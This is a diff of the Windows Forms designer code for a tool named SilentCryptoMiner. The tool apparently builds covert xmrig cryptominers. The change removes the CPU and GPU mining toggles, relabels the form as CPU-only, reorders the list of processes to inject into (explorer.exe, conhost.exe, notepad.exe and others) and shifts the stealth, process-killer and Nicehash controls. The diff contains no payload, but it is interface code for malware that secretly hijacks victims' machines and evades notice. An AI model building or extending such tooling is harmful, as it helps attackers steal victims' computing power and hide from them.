@@ -63,8 +63,6 @@ namespace SilentCryptoMiner
             this.labelMinerMiningIdleCPU = new System.Windows.Forms.Label();
             this.labelMinerMiningSSL = new System.Windows.Forms.Label();
             this.toggleSSL = new MephToggleSwitch();
-            this.labelMinerMiningCPU = new System.Windows.Forms.Label();
-            this.toggleCPU = new MephToggleSwitch();
             this.labelMinerMiningNicehash = new System.Windows.Forms.Label();
             this.toggleNicehash = new MephToggleSwitch();
             this.labelMinerMiningIdle = new System.Windows.Forms.Label();
@@ -72,7 +70,6 @@ namespace SilentCryptoMiner
             this.labelMinerMiningMaxCPU = new System.Windows.Forms.Label();
             this.txtIdleWait = new MephTextBox();
             this.tabAdvanced = new System.Windows.Forms.TabPage();
-            this.toggleGPU = new MephToggleSwitch();
             this.toggleStealthFullscreen = new MephToggleSwitch();
             this.labelMinerAdvancedStealthFullscreen = new System.Windows.Forms.Label();
             this.chkAPI = new MephCheckBox();
@@ -85,7 +82,6 @@ namespace SilentCryptoMiner
             this.txtStealthTargets = new MephTextBox();
             this.txtAdvParam = new MephTextBox();
             this.txtRemoteConfig = new MephTextBox();
-            this.labelMinerMiningGPU = new System.Windows.Forms.Label();
             this.tabJSON = new System.Windows.Forms.TabPage();
             this.txtJSON = new MephTextBox();
             this.formMinerXMR.SuspendLayout();
@@ -110,7 +106,7 @@ namespace SilentCryptoMiner
             this.formMinerXMR.MinimumSize = new System.Drawing.Size(535, 272);
             this.formMinerXMR.Name = "formMinerXMR";
             this.formMinerXMR.Size = new System.Drawing.Size(535, 272);
-            this.formMinerXMR.SubHeader = "Create a new miner (xmrig)";
+            this.formMinerXMR.SubHeader = "Create a new miner (xmrig - CPU)";
             this.formMinerXMR.TabIndex = 0;
             this.formMinerXMR.Text = "Create New Miner";
             // 
@@ -171,8 +167,8 @@ namespace SilentCryptoMiner
             this.comboInjection.ItemHeight = 16;
             this.comboInjection.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
             this.comboInjection.Items.AddRange(new object[] {
-            "explorer.exe",
             "conhost.exe",
+            "explorer.exe",
             "nslookup.exe",
             "cmd.exe",
             "notepad.exe",
@@ -279,8 +275,6 @@ namespace SilentCryptoMiner
             this.tabMining.Controls.Add(this.labelMinerMiningIdleCPU);
             this.tabMining.Controls.Add(this.labelMinerMiningSSL);
             this.tabMining.Controls.Add(this.toggleSSL);
-            this.tabMining.Controls.Add(this.labelMinerMiningCPU);
-            this.tabMining.Controls.Add(this.toggleCPU);
             this.tabMining.Controls.Add(this.labelMinerMiningNicehash);
             this.tabMining.Controls.Add(this.toggleNicehash);
             this.tabMining.Controls.Add(this.labelMinerMiningIdle);
@@ -298,7 +292,7 @@ namespace SilentCryptoMiner
             // 
             this.labelMinerMiningProcessKiller.AutoEllipsis = true;
             this.labelMinerMiningProcessKiller.Font = new System.Drawing.Font("Segoe UI", 9.5F);
-            this.labelMinerMiningProcessKiller.Location = new System.Drawing.Point(11, 120);
+            this.labelMinerMiningProcessKiller.Location = new System.Drawing.Point(11, 93);
             this.labelMinerMiningProcessKiller.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
             this.labelMinerMiningProcessKiller.Name = "labelMinerMiningProcessKiller";
             this.labelMinerMiningProcessKiller.Size = new System.Drawing.Size(115, 17);
@@ -310,7 +304,7 @@ namespace SilentCryptoMiner
             this.toggleProcessKiller.BackColor = System.Drawing.Color.Transparent;
             this.toggleProcessKiller.Checked = false;
             this.toggleProcessKiller.ForeColor = System.Drawing.Color.Black;
-            this.toggleProcessKiller.Location = new System.Drawing.Point(130, 117);
+            this.toggleProcessKiller.Location = new System.Drawing.Point(130, 90);
             this.toggleProcessKiller.Margin = new System.Windows.Forms.Padding(2);
             this.toggleProcessKiller.Name = "toggleProcessKiller";
             this.toggleProcessKiller.Size = new System.Drawing.Size(50, 24);
@@ -339,7 +333,6 @@ namespace SilentCryptoMiner
             this.comboAlgorithm.Items.AddRange(new object[] {
             "rx/0",
             "gr",
-            "cn/gpu",
             "cn/upx2",
             "argon2/chukwav2",
             "cn/ccx",
@@ -380,7 +373,7 @@ namespace SilentCryptoMiner
             // 
             this.labelMinerMiningStealth.AutoEllipsis = true;
             this.labelMinerMiningStealth.Font = new System.Drawing.Font("Segoe UI", 9.5F);
-            this.labelMinerMiningStealth.Location = new System.Drawing.Point(11, 93);
+            this.labelMinerMiningStealth.Location = new System.Drawing.Point(11, 66);
             this.labelMinerMiningStealth.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
             this.labelMinerMiningStealth.Name = "labelMinerMiningStealth";
             this.labelMinerMiningStealth.Size = new System.Drawing.Size(115, 17);
@@ -392,7 +385,7 @@ namespace SilentCryptoMiner
             this.toggleStealth.BackColor = System.Drawing.Color.Transparent;
             this.toggleStealth.Checked = false;
             this.toggleStealth.ForeColor = System.Drawing.Color.Black;
-            this.toggleStealth.Location = new System.Drawing.Point(131, 90);
+            this.toggleStealth.Location = new System.Drawing.Point(131, 63);
             this.toggleStealth.Margin = new System.Windows.Forms.Padding(2);
             this.toggleStealth.Name = "toggleStealth";
             this.toggleStealth.Size = new System.Drawing.Size(50, 24);
@@ -492,7 +485,7 @@ namespace SilentCryptoMiner
             // 
             this.labelMinerMiningSSL.AutoEllipsis = true;
             this.labelMinerMiningSSL.Font = new System.Drawing.Font("Segoe UI", 9.5F);
-            this.labelMinerMiningSSL.Location = new System.Drawing.Point(11, 39);
+            this.labelMinerMiningSSL.Location = new System.Drawing.Point(11, 12);
             this.labelMinerMiningSSL.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
             this.labelMinerMiningSSL.Name = "labelMinerMiningSSL";
             this.labelMinerMiningSSL.Size = new System.Drawing.Size(115, 17);
@@ -504,39 +497,17 @@ namespace SilentCryptoMiner
             this.toggleSSL.BackColor = System.Drawing.Color.Transparent;
             this.toggleSSL.Checked = false;
             this.toggleSSL.ForeColor = System.Drawing.Color.Black;
-            this.toggleSSL.Location = new System.Drawing.Point(130, 36);
+            this.toggleSSL.Location = new System.Drawing.Point(130, 9);
             this.toggleSSL.Margin = new System.Windows.Forms.Padding(2);
             this.toggleSSL.Name = "toggleSSL";
             this.toggleSSL.Size = new System.Drawing.Size(50, 24);
             this.toggleSSL.TabIndex = 41;
             // 
-            // labelMinerMiningCPU
-            // 
-            this.labelMinerMiningCPU.AutoEllipsis = true;
-            this.labelMinerMiningCPU.Font = new System.Drawing.Font("Segoe UI", 9.5F);
-            this.labelMinerMiningCPU.Location = new System.Drawing.Point(11, 11);
-            this.labelMinerMiningCPU.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
-            this.labelMinerMiningCPU.Name = "labelMinerMiningCPU";
-            this.labelMinerMiningCPU.Size = new System.Drawing.Size(115, 17);
-            this.labelMinerMiningCPU.TabIndex = 34;
-            this.labelMinerMiningCPU.Text = "CPU Mining";
-            // 
-            // toggleCPU
-            // 
-            this.toggleCPU.BackColor = System.Drawing.Color.Transparent;
-            this.toggleCPU.Checked = true;
-            this.toggleCPU.ForeColor = System.Drawing.Color.Black;
-            this.toggleCPU.Location = new System.Drawing.Point(130, 9);
-            this.toggleCPU.Margin = new System.Windows.Forms.Padding(2);
-            this.toggleCPU.Name = "toggleCPU";
-            this.toggleCPU.Size = new System.Drawing.Size(50, 24);
-            this.toggleCPU.TabIndex = 33;
-            // 
             // labelMinerMiningNicehash
             // 
             this.labelMinerMiningNicehash.AutoEllipsis = true;
             this.labelMinerMiningNicehash.Font = new System.Drawing.Font("Segoe UI", 9.5F);
-            this.labelMinerMiningNicehash.Location = new System.Drawing.Point(11, 66);
+            this.labelMinerMiningNicehash.Location = new System.Drawing.Point(11, 39);
             this.labelMinerMiningNicehash.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
             this.labelMinerMiningNicehash.Name = "labelMinerMiningNicehash";
             this.labelMinerMiningNicehash.Size = new System.Drawing.Size(115, 17);
@@ -548,7 +519,7 @@ namespace SilentCryptoMiner
             this.toggleNicehash.BackColor = System.Drawing.Color.Transparent;
             this.toggleNicehash.Checked = false;
             this.toggleNicehash.ForeColor = System.Drawing.Color.Black;
-            this.toggleNicehash.Location = new System.Drawing.Point(131, 63);
+            this.toggleNicehash.Location = new System.Drawing.Point(131, 36);
             this.toggleNicehash.Margin = new System.Windows.Forms.Padding(2);
             this.toggleNicehash.Name = "toggleNicehash";
             this.toggleNicehash.Size = new System.Drawing.Size(50, 24);
@@ -609,7 +580,6 @@ namespace SilentCryptoMiner
             // tabAdvanced
             // 
             this.tabAdvanced.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
-            this.tabAdvanced.Controls.Add(this.toggleGPU);
             this.tabAdvanced.Controls.Add(this.toggleStealthFullscreen);
             this.tabAdvanced.Controls.Add(this.labelMinerAdvancedStealthFullscreen);
             this.tabAdvanced.Controls.Add(this.chkAPI);
@@ -622,23 +592,11 @@ namespace SilentCryptoMiner
             this.tabAdvanced.Controls.Add(this.txtStealthTargets);
             this.tabAdvanced.Controls.Add(this.txtAdvParam);
             this.tabAdvanced.Controls.Add(this.txtRemoteConfig);
-            this.tabAdvanced.Controls.Add(this.labelMinerMiningGPU);
             this.tabAdvanced.Location = new System.Drawing.Point(89, 4);
             this.tabAdvanced.Name = "tabAdvanced";
             this.tabAdvanced.Size = new System.Drawing.Size(418, 189);
             this.tabAdvanced.TabIndex = 7;
             this.tabAdvanced.Text = "Advanced";
-            // 
-            // toggleGPU
-            // 
-            this.toggleGPU.BackColor = System.Drawing.Color.Transparent;
-            this.toggleGPU.Checked = false;
-            this.toggleGPU.ForeColor = System.Drawing.Color.Black;
-            this.toggleGPU.Location = new System.Drawing.Point(143, 12);
-            this.toggleGPU.Margin = new System.Windows.Forms.Padding(2);
-            this.toggleGPU.Name = "toggleGPU";
-            this.toggleGPU.Size = new System.Drawing.Size(50, 24);
-            this.toggleGPU.TabIndex = 132;
             // 
             // toggleStealthFullscreen
             // 
@@ -815,19 +773,6 @@ namespace SilentCryptoMiner
             this.txtRemoteConfig.UseSystemPasswordChar = false;
             this.txtRemoteConfig.WordWrap = false;
             // 
-            // labelMinerMiningGPU
-            // 
-            this.labelMinerMiningGPU.AutoEllipsis = true;
-            this.labelMinerMiningGPU.BackColor = System.Drawing.Color.Transparent;
-            this.labelMinerMiningGPU.Font = new System.Drawing.Font("Segoe UI", 9.5F);
-            this.labelMinerMiningGPU.ForeColor = System.Drawing.Color.Gray;
-            this.labelMinerMiningGPU.Location = new System.Drawing.Point(14, 15);
-            this.labelMinerMiningGPU.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
-            this.labelMinerMiningGPU.Name = "labelMinerMiningGPU";
-            this.labelMinerMiningGPU.Size = new System.Drawing.Size(130, 17);
-            this.labelMinerMiningGPU.TabIndex = 133;
-            this.labelMinerMiningGPU.Text = "GPU Mining:";
-            // 
             // tabJSON
             // 
             this.tabJSON.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
@@ -908,8 +853,6 @@ namespace SilentCryptoMiner
         internal Label labelMinerMiningIdleCPU;
         internal Label labelMinerMiningSSL;
         internal MephToggleSwitch toggleSSL;
-        internal Label labelMinerMiningCPU;
-        internal MephToggleSwitch toggleCPU;
         internal Label labelMinerMiningNicehash;
         internal MephToggleSwitch toggleNicehash;
         internal Label labelMinerMiningIdle;
@@ -934,7 +877,5 @@ namespace SilentCryptoMiner
         private MephTextBox txtJSON;
         internal Label labelMinerAdvancedStealthFullscreen;
         internal MephToggleSwitch toggleStealthFullscreen;
-        internal MephToggleSwitch toggleGPU;
-        internal Label labelMinerMiningGPU;
     }
 }
